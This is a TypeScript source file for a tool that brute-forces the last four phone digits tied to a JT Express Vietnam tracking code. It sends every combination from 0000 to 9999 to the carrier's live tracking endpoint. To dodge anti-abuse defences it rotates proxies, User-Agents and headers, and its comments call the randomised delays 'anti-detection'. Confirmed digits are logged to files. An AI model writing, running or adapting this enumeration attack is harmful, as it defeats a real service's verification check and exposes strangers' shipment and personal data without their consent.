import axios, { AxiosInstance } from 'axios';
import { HttpProxyAgent } from 'http-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import * as fs from 'node:fs';
import * as path from 'node:path';

/**
 * Brute-Force Phone Number Finder for JT Express
 * Tries all last 4 digit combinations (0000-9999) to find the valid phone
 * Only requires the tracking code (billcode)
 * Supports proxy rotation
 */

interface ProxyConfig {
  protocol: string;
  hostname: string;
  port: number;
  auth: {
    username: string;
    password: string;
  };
}

interface SearchResult {
  billcode: string;
  lastFourDigits: string;
  attemptNumber: number;
  elapsedSeconds: number;
}

interface AxiosRequestConfig {
  params?: {
    type: string;
    billcode: string;
    cellphone: string;
  };
  timeout?: number;
  validateStatus?: () => boolean;
  headers?: Record<string, string>;
  httpAgent?: HttpProxyAgent<any>;
  httpsAgent?: HttpsProxyAgent<any>;
}

class PhoneBruteForceFinder {
  private baseUrl: string = 'https://jtexpress.vn/vi/tracking';
  private proxies: string[];
  private currentProxyIndex: number;
  private userAgents: string[];
  private languages: string[];
  private headers: Record<string, string>;
  private client: AxiosInstance;

  constructor(proxies: string[] = []) {
    this.proxies = proxies;
    this.currentProxyIndex = 0;
    
    // User-Agent rotation list
    this.userAgents = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    ];
    
    // Accept-Language rotation
    this.languages = [
      'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6',
      'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
      'en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7'
    ];
    
    this.headers = {
      'Accept': '*/*',
      'Accept-Language': this.getRandomLanguage(),
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://jtexpress.vn',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': this.getRandomUserAgent(),
      'X-OCTOBER-REQUEST-HANDLER': 'onSearchPriceList',
      'X-OCTOBER-REQUEST-PARTIALS': 'search/pricelist/result-list-search',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': this.getRandomPlatform()
    };

    this.client = axios.create({
      headers: this.headers,
      timeout: 10000,
      validateStatus: () => true
    });
  }

  /**
   * Get random User-Agent
   */
  getRandomUserAgent(): string {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  /**
   * Get random Accept-Language
   */
  getRandomLanguage(): string {
    return this.languages[Math.floor(Math.random() * this.languages.length)];
  }

  /**
   * Get random platform
   */
  getRandomPlatform(): string {
    const platforms = ['"macOS"', '"Windows"', '"Linux"'];
    return platforms[Math.floor(Math.random() * platforms.length)];
  }

  /**
   * Get random delay with fixed range (2000-3000ms for anti-detection)
   * @returns {number} Random delay between 2000-3000ms
   */
  getRandomDelay(): number {
    const min = 2000;
    const max = 3000;
    return Math.floor(Math.random() * (max - min) + min);
  }

  /**
   * Parse proxy string and return proxy config
   * Format: IP:PORT:USERNAME:PASSWORD
   * @param {string} proxyString - Proxy string
   * @returns {Object} Proxy config for axios
   */
  parseProxy(proxyString: string): ProxyConfig | null {
    if (!proxyString) return null;

    const parts = proxyString.split(':');
    if (parts.length !== 4) {
      console.error('❌ Invalid proxy format. Use: IP:PORT:USERNAME:PASSWORD');
      return null;
    }

    const [ip, port, username, password] = parts;

    return {
      protocol: 'http',
      hostname: ip,
      port: Number.parseInt(port, 10),
      auth: {
        username: username,
        password: password
      }
    };
  }

  /**
   * Get next proxy in rotation
   * @returns {Object|null} Proxy config or null if no proxies
   */
  getNextProxy(): ProxyConfig | null {
    if (!this.proxies || this.proxies.length === 0) {
      return null;
    }

    const proxy = this.proxies[this.currentProxyIndex];
    this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;

    return this.parseProxy(proxy);
  }

  /**
   * Set proxies from array
   * @param {Array<string>} proxies - Array of proxy strings
   */
  setProxies(proxies: string[]): void {
    this.proxies = proxies;
    this.currentProxyIndex = 0;
    console.log(`✅ Loaded ${proxies.length} proxies`);
  }

  /**
   * Check if a phone number is valid for a tracking code
   * by making a request to the API
   * @param {string} billcode - Tracking number
   * @param {string} cellphone - Last 4 digits
   * @returns {Promise<Object>} Response details
   */
  async checkPhoneValidity(billcode: string, cellphone: string): Promise<{
    status: number | string;
    isValid: boolean;
    data?: unknown;
    statusCode?: number;
    error?: string;
  }> {
    try {

      // Get next proxy if available
      const proxy = this.getNextProxy();
      const requestConfig: AxiosRequestConfig = {
        params: { type: 'track', billcode, cellphone },
        timeout: 15000,
        validateStatus: () => true,
        headers: {
          'User-Agent': this.getRandomUserAgent(),
          'Accept-Language': this.getRandomLanguage(),
          'sec-ch-ua-platform': this.getRandomPlatform()
        }
      };

      // Add proxy to request if available
      if (proxy) {
        const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;
        
        requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
        requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
      }

      // Log request
      const proxyInfo = proxy ? `[${proxy.hostname}:${proxy.port}]` : '[No Proxy]';
      console.log(`📤 Request: ${cellphone} ${proxyInfo}`);

      const response = await this.client.get(
        this.baseUrl,
        requestConfig
      );

      // Log response
      const responseStr = JSON.stringify(response.data).substring(0, 200);
      console.log(`   📧 Response [${response.status}]: ${responseStr}`);
      
      // Check if response contains error message about not finding data
      // Invalid: contains "Không tìm thấy dữ liệu về vận đơn..."
      // Valid: doesn't contain error message and status 200
      const hasError = JSON.stringify(response.data)?.includes('Không tìm thấy dữ liệu về vận đơn');
      
      if (!hasError && response.status === 200) {
        console.log(`   ✅ ${cellphone} - Valid`);
        // Save to instant log file
        this.logValidPhoneToFile(billcode, cellphone);
      } else {
        console.log(`   ❌ ${cellphone} - Invalid (Error message found)`);
      }

      return {
        status: response.status,
        isValid: !hasError && response.status === 200,
        data: response.data,
        statusCode: response.status
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      const errorCode = error instanceof Error && 'code' in error ? (error as any).code : undefined;
      console.log(`   ⚠️  ${cellphone} - Error: ${errorCode || errorMessage}`);
      return {
        status: 'error',
        isValid: false,
        error: errorMessage
      };
    }
  }

  /**
   * Brute-force find the valid phone number for a tracking code
   * Tries all combinations from 0000 to 9999
   * @param {string} billcode - Tracking number (required)
   * @param {Object} options - Configuration options
   * @param {number} options.delayMs - Delay between requests (default: 800ms)
   * @param {boolean} options.verbose - Log every attempt (default: false)
   * @param {number} options.maxAttempts - Stop after N attempts (default: 10000)
   * @param {number} options.startFrom - Start from this number (default: 0, e.g. 406)
   * @returns {Promise<Object>} Result with found phone or null
   */
  async findPhone(
    billcode: string,
    options: {
      delayMs?: number;
      verbose?: boolean;
      maxAttempts?: number;
      startFrom?: number;
    } = {}
  ): Promise<SearchResult | {
    status: string;
    billcode: string;
    validPhones?: SearchResult[];
    totalAttempts?: number;
    totalSeconds?: number;
  }> {
    const {
      delayMs = 800,
      verbose = false,
      maxAttempts = 10000,
      startFrom = 0
    } = options;

    console.log(`\n🔍 Searching for valid phone number for tracking: ${billcode}`);
    console.log(`📊 Trying combinations ${String(startFrom).padStart(4, '0')}-9999 (max ${maxAttempts - startFrom} attempts)`);
    const estimatedTime = ((maxAttempts - startFrom) * delayMs) / 1000 / 3600;
    console.log(`Est time: ${estimatedTime.toFixed(2)} hours`);
    console.log('⏱️  Delay between requests:', delayMs, 'ms');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const startTime = Date.now();
    let attemptCount = 0;
    const validPhones: SearchResult[] = [];

    // Try all 4-digit combinations (starting from startFrom to 9999)
    for (let i = startFrom; i < maxAttempts; i++) {
      const lastFourDigits = String(i).padStart(4, '0');
      attemptCount++;

      if (verbose || attemptCount % 100 === 0) {
        process.stdout.write(`\r⏳ Attempt: ${attemptCount}/${maxAttempts} | Testing: ${lastFourDigits}`);
      }

      // Check this combination
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(2);
        
        console.log(`\n\n✅ ✅ ✅ VALID PHONE FOUND ✅ ✅ ✅`);
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log(`📦 Tracking Code (Billcode): ${billcode}`);
        console.log(`📱 Last 4 Digits of Phone:   ${lastFourDigits}`);
        console.log(`🔍 Found at attempt:         ${attemptCount}/${maxAttempts}`);
        console.log(`⏱️  Time taken:               ${elapsedSeconds} seconds`);
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

        validPhones.push({
          billcode: billcode,
          lastFourDigits: lastFourDigits,
          attemptNumber: attemptCount,
          elapsedSeconds: Number.parseFloat(elapsedSeconds)
        });

        // Stop searching after finding first valid phone
        // Return consistent format with validPhones array
        return {
          status: 'success',
          billcode: billcode,
          validPhones: validPhones,
          totalAttempts: attemptCount,
          totalSeconds: Number.parseFloat(elapsedSeconds)
        };
      }

      // Rate limiting with random variation (1000-2000ms)
      const randomDelay = this.getRandomDelay();
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Summary
    const totalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);

    if (validPhones.length > 0) {
      console.log('✅ SEARCH COMPLETED - Valid Phone Numbers Found:');
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
      validPhones.forEach((phone, index) => {
        console.log(`${index + 1}. ${phone.lastFourDigits} (found at attempt ${phone.attemptNumber})`);
      });
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
      
      // Save results to file
      this.saveResultsToFile(billcode, validPhones, totalSeconds);
    } else {
      console.log('\n❌ No valid phone numbers found');
      console.log(`⏱️  Searched for ${totalSeconds} seconds`);
    }

    return {
      status: validPhones.length > 0 ? 'success' : 'not_found',
      billcode: billcode,
      validPhones: validPhones,
      totalAttempts: attemptCount,
      totalSeconds: Number.parseFloat(totalSeconds)
    };
  }

  /**
   * Quick find - stops at first match
   * Fast option if you only need one phone
   * @param {string} billcode - Tracking number
   * @param {number} delayMs - Delay between requests
   * @returns {Promise<Object>} First valid phone found
   */
  async findPhoneQuick(billcode: string, delayMs: number = 500): Promise<{
    status: string;
    billcode: string;
    lastFourDigits?: string | null;
    attemptNumber?: number;
  }> {
    console.log(`\n🔍 Quick search for: ${billcode}`);
    const startTime = Date.now();

    for (let i = 406; i < 10000; i++) {
      const lastFourDigits = String(i).padStart(4, '0');

      process.stdout.write(`\r⏳ Testing: ${lastFourDigits}`);

      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        console.log(`\n✅ Found: ${lastFourDigits}\n`);
        
        // Save to file
        const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(2);
        const resultData = {
          billcode: billcode,
          lastFourDigits: lastFourDigits,
          attemptNumber: i + 1,
          elapsedSeconds: Number.parseFloat(elapsedSeconds)
        };
        this.saveResultsToFile(billcode, [resultData], elapsedSeconds);
        
        return {
          status: 'success',
          billcode: billcode,
          lastFourDigits: lastFourDigits,
          attemptNumber: i + 1
        };
      }

      const randomDelay = this.getRandomDelay();
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    console.log(`\n❌ Not found\n`);
    return {
      status: 'not_found',
      billcode: billcode,
      lastFourDigits: null
    };
  }

  /**
   * Log valid phone number to instant log file (real-time)
   * @param {string} billcode - Tracking code
   * @param {string} lastFourDigits - Valid phone last 4 digits
   */
  logValidPhoneToFile(billcode: string, lastFourDigits: string): void {
    try {
      const logsDir = path.join(__dirname, '../logs');
      if (!fs.existsSync(logsDir)) {
        fs.mkdirSync(logsDir, { recursive: true });
      }

      const logFile = path.join(logsDir, 'valid_phones.log');
      const timestamp = new Date().toISOString();
      const logEntry = `[${timestamp}] Billcode: ${billcode} | Phone: ${lastFourDigits}\n`;

      fs.appendFileSync(logFile, logEntry, 'utf8');
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error(`⚠️  Failed to log: ${errorMessage}`);
    }
  }

  /**
   * Save search results to a log file
   * @param {string} billcode - Tracking code
   * @param {Array} validPhones - Array of valid phones found
   * @param {number} totalSeconds - Total time taken
   */
  saveResultsToFile(billcode: string, validPhones: SearchResult[], totalSeconds: string | number): void {
    try {
      // Create results directory if it doesn't exist
      const resultsDir = path.join(__dirname, '../results');
      if (!fs.existsSync(resultsDir)) {
        fs.mkdirSync(resultsDir, { recursive: true });
      }

      // Create filename with timestamp
      const timestamp = new Date().toISOString().replaceAll(/[:.]/g, '-');
      const filename = `${billcode}_${timestamp}.txt`;
      const filepath = path.join(resultsDir, filename);

      // Prepare content
      let content = `=====================================\n`;
      content += `JT Express - Phone Found Results\n`;
      content += `=====================================\n\n`;
      content += `Tracking Code: ${billcode}\n`;
      content += `Timestamp: ${new Date().toLocaleString()}\n`;
      content += `Time Taken: ${totalSeconds} seconds\n\n`;
      content += `Valid Phone Numbers Found: ${validPhones.length}\n`;
      content += `-------------------------------------\n`;

      validPhones.forEach((phone, index) => {
        content += `${index + 1}. Last 4 Digits: ${phone.lastFourDigits}\n`;
        content += `   Found at attempt: ${phone.attemptNumber}\n`;
        content += `   Elapsed: ${phone.elapsedSeconds}s\n\n`;
      });

      // Write to file
      fs.writeFileSync(filepath, content, 'utf8');
      console.log(`\n💾 Results saved to: ${filepath}`);
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error(`⚠️  Failed to save results: ${errorMessage}`);
    }
  }
}

export default PhoneBruteForceFinder;
